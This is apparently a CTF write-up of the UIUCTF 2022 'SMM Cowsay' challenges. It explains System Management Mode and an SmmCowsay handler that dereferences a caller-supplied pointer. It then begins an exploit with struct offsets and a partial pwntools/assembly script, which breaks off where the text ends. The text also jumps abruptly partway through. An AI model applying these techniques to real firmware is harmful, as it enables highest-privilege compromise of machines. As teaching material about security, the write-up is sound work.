---
title:      UIUCTF 2022 - SMM Cowsay 1, 2, 3
author:     Marco Bonelli - @mebeim
date:       2022-08-15 13:37:00 +0200
summary:    ROP shenanigans to pwn UEFI drivers running in x86 System Management Mode
categories: UIUCTF pwn system x86 rop
tags:
 - UIUCTF
 - Pwn
 - System
 - x86
 - ROP
---

**Jump to**: [SMM Cowsay 1][smm1], [SMM Cowsay 2][smm2], [SMM Cowsay 3][smm3].

---

There was a pretty interesting "systems" category in [UIUCTF 2022][uiuctf]. In
this category, three challenges of increasing difficulty called "SMM Cowsay"
caught my eye. Unfortunately, I wasn't able to solve them before the end of the
CTF, but I found them so interesting that I kept going at them after the CTF,
and [ended up solving all three][tweet] after studying them enough time.

Huge shout out to the author of these awesome challenges: [YiFei Zhu][author],
who was also so kind to award me the small bounty of $50 posted on the first
blood for SMM Cowsay 3, which had remained unsolved after the CTF ended. All the
challenge files should still be up in the
[archived UIUCTF 2022 website][uiuctf-archive].


## Background on System Management Mode

[System Management Mode][wiki-smm] is documented in [Intel SDM][intel-sdm],
Volume 3C, Chapter 30. It is the operating mode with highest privilege, and
sometimes referred to as "ring -2". This mode has higher privilege than an
OS/kernel (ring 0) and even an hypervisor (ring -1). It can only be entered

    if (!CommBuffer || !CommBufferSize || *CommBufferSize < sizeof(CHAR16 *))
        return EFI_SUCCESS;

    Cowsay(*(CONST CHAR16 **)CommBuffer); // <== pointer passed *as is* here

    DEBUG ((DEBUG_INFO, "SmmCowsay SmmCowsayHandler Exit\n"));

    return EFI_SUCCESS;
}
```

This means that we can pass an arbitrary pointer to the `SmmCowsay` driver, and
it will happily read memory at the given address for us, displaying it on the
console as if it was a NUL-terminated `CHAR16` string. If we build an
`EFI_SMM_COMMUNICATE_HEADER` with `->Data` containing the value `0x44440000` and
pass it to the SMM driver through `mSmmCommunication->Communicate`, we can get
it to print the flag for us!

But how do we get ahold of this "SmmCommunication" protocol to call its
`->Communicate()` method? Taking a look at the code in `Binexec.efi`,
`mSmmCommunication` is simply a pointer obtained passing the right GUID to
`BootServices->LocateProtocol()`, like this:

```c
    Status = gBS->LocateProtocol(
        &gEfiSmmCommunicationProtocolGuid,
        NULL,
        (VOID **)&mSmmCommunication
        );
```


## Exploitation

All we need to do in order to get the flag is simply replicate exactly what the
`Binexec` driver is doing, passing a different pointer to `SmmCowsay` and let it
print the memory content to the console for us. In theory we could do everything
with a single piece of assembly, but since we have the ability to send multiple
pieces of code in a loop and observe the results, let's split this into simpler
steps so that we can check if things are OK along the way.

### Step 1: get ahold of BootServices->LocateProtocol

The `LocateProtocol` function is provided in the `BootServices` table (`gBS`),
of which we actually have a pointer in the `SystemTable`. We know the address of
`SystemTable` since it is printed to the console for us, though to be pedantic
this does not really matter since it is a fixed address and there isn't any kind
of address randomization going on.

We need to get `SystemTable->BootServices->LocateProtocol`. In theory all
addresses are fixed in our working environment (both locally and remote) due to
no ASLR being applied by EDK2, so we *could* just get the address of any
function we need and do direct calls, but let's do it the right way because (1)
we'll actually learn something, (2) we'll nonethless need it for the next
challenges and most importantly (3) *I did not think about it originally and I
already have the code to do it anyway :')*.

We can get `LocateProtocol` pretty easily with a couple of MOV instructions. The
debug artifacts provided with the challenge files also include all the structure
definitions we need in the debug symbols, so we can check the DWARF info in
`handout/edk2_artifacts/Binexec.debug` to get the offsets of the fields. I'll
use [the `pahole` utility][man-pahole] (from the `dwarves` Debian package) for
this:

```c
$ pahole -C EFI_SYSTEM_TABLE handout/edk2_artifacts/Binexec.debug

typedef struct {
    EFI_TABLE_HEADER           Hdr;                  /*     0    24 */
    CHAR16 *                   FirmwareVendor;       /*    24     8 */
    UINT32                     FirmwareRevision;     /*    32     4 */

    /* XXX 4 bytes hole, try to pack */

    EFI_HANDLE                 ConsoleInHandle;      /*    40     8 */
    EFI_SIMPLE_TEXT_INPUT_PROTOCOL * ConIn;          /*    48     8 */
    EFI_HANDLE                 ConsoleOutHandle;     /*    56     8 */
    /* --- cacheline 1 boundary (64 bytes) --- */
    EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL * ConOut;        /*    64     8 */
    EFI_HANDLE                 StandardErrorHandle;  /*    72     8 */
    EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL * StdErr;        /*    80     8 */
    EFI_RUNTIME_SERVICES *     RuntimeServices;      /*    88     8 */
    EFI_BOOT_SERVICES *        BootServices;         /*    96     8 */
    UINTN                      NumberOfTableEntries; /*   104     8 */
    EFI_CONFIGURATION_TABLE *  ConfigurationTable;   /*   112     8 */

    /* size: 120, cachelines: 2, members: 13 */
    /* sum members: 116, holes: 1, sum holes: 4 */
    /* last cacheline: 56 bytes */
} EFI_SYSTEM_TABLE;
```

This tells us that `BootServices` is at offset 96 in `SystemTable` (type
`EFI_SYSTEM_TABLE`). Likewise we can look at `EFI_BOOT_SERVICES` to see that
`LocateProtocol` is at offset `320` in
`BootServices`.

Setting things up with Python and pwtools, the code needed is as follows:

```python
# Little hack needed to disable pwntools from taking over the terminal with
# ncurses and breaking the output if we do conn.interactive() since the remote
# program outputs \r\n for newlines.
import os
os.environ['PWNLIB_NOTERM'] = '1'

from pwn import *

context(arch='amd64')

os.chdir('handout/run')
conn = process('./run.sh')
os.chdir('../..')

conn.recvuntil(b'Address of SystemTable: ')
system_table = int(conn.recvline(), 16)

log.info('SystemTable @ 0x%x', system_table)

conn.recvline()

code = asm(f'''
